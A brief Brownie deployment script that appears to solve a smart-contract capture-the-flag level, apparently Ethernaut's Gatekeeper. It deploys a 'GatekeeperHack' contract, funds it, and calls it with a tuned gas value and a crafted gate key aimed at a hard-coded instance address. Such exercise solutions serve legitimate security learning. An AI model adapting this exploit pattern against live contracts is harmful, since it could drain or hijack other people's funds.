from brownie import GatekeeperHack, accounts

INSTANCE_ADDRESS = "0x63521ebA02D3b6c44b59fdceEDE72d05C4678a07"
GAS = 41209
GATE_KEY = 0x0101010100006ca6 # latest 2 bytes should be eq to the latest 2 bytes from account
ACCOUNT = 'straul'


def get_account():
    return accounts.load(ACCOUNT)

def deploy_gatekeeper_hack(account):
    # deploy gategeeker_hack contract
    gatekeeper_hack = GatekeeperHack.deploy({"from": account})

    # fund the contract with some ether for gas fees
    account.transfer(to=gatekeeper_hack.address, amount=1e14)
    return gatekeeper_hack

def enter_gate(account, gatekeeper_hack):
    tx = gatekeeper_hack.hackGate(INSTANCE_ADDRESS, GAS, GATE_KEY, {'from': account})

def main():
    account = get_account()
    gatekeeper_hack = deploy_gatekeeper_hack(account)
    enter_gate(account, gatekeeper_hack)
